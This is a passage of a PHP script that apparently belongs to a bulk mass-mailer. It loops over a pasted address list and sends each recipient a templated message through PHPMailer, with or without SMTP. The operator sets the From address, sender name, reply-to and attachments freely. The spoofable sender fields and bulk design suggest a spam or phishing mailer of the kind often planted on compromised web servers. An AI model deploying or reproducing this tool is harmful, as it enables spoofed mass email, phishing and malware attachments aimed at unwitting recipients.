            print '<div class="col-lg-1">['.$x.'/'.$n.']</div><div class="col-lg-5">'.$email.'</div>';
            if(!ninjaxMailCheck($email)) {
                print '<div class="col-lg-6"><span class="label label-default">Incorrect Email</span></div>';
                print "<br>\r\n";
            }
            else {
                $mail = new PHPMailer;
                $mail->setFrom(ninjaxClear($senderEmail,$email),ninjaxClear($senderName,$email));
                $mail->addReplyTo(ninjaxClear($replyTo,$email));
                $mail->addAddress($email);
                $mail->Subject = ninjaxClear($subject,$email);
                $strss = ninjaxClear($messageLetter,$email);
                $mail->Body =  ninjaxClear($messageLetter,$email);
                
                $mail->CharSet = $encode;
                for($i=0; $i<count($_FILES['attachment']['name']); $i++) {
                    if ($_FILES['attachment']['tmp_name'][$i] != ""){
                        $mail->AddAttachment($_FILES['attachment']['tmp_name'][$i],$_FILES['attachment']['name'][$i]);
                    }
    
                }
                if($messageType==1){$mail->IsHTML(true);}
                else {$mail->IsHTML(false);}
                if (!$mail->send()) {
                    echo '<div class="col-lg-6"><span class="label label-default">'.$mail->ErrorInfo.'</span></div>';
                }
                else {
                    echo '<div class="col-lg-6"><span class="label label-success">SENT</span></div>';
                    
                }
                print "<br>\r\n";
            }
            $x++;
            for($k = 0; $k < 40000; $k++) {echo ' ';}
        }
        
        print '<br><hr><br><br></body>';
        die();

    } 

    //no smtp
    print '    <div class="col-lg-12">';
    $maillist=explode("\r\n", $emailList);
    $n=count($maillist);
    $x =1;
    foreach ($maillist as $email ) {
        print '<div class="col-lg-1">['.$x.'/'.$n.']</div><div class="col-lg-5">'.$email.'</div>';
        if(!ninjaxMailCheck($email)) {
            print '<div class="col-lg-6"><span class="label label-default">Incorrect Email</span></div>';
            print "<br>\r\n";
        }
        else {
            $mail = new PHPMailer;
            $mail->setFrom(ninjaxClear($senderEmail,$email),ninjaxClear($senderName,$email));
            $mail->addReplyTo(ninjaxClear($replyTo,$email));
            $mail->addAddress($email);
            $mail->Subject = ninjaxClear($subject,$email);
            $mail->Body =  ninjaxClear($messageLetter,$email);
            $mail->CharSet = $encode;
            for($i=0; $i<count($_FILES['attachment']['name']); $i++) {
                if ($_FILES['attachment']['tmp_name'][$i] != ""){
                    $mail->AddAttachment($_FILES['attachment']['tmp_name'][$i],$_FILES['attachment']['name'][$i]);
                }

            }
            if($messageType==1){$mail->IsHTML(true);}
            else {$mail->IsHTML(false);}
            if (!$mail->send()) {
                echo '<div class="col-lg-6"><span class="label label-default">'.$mail->ErrorInfo.'</span></div>';
            }
            else {
                echo '<div class="col-lg-6"><span class="label label-success">SENT</span></div>';
            }
            print "<br>\r\n";
        }
        $x++;
        for($k = 0; $k < 40000; $k++) {echo ' ';}
    }

}
print '<br><hr><br><br></body>';
?>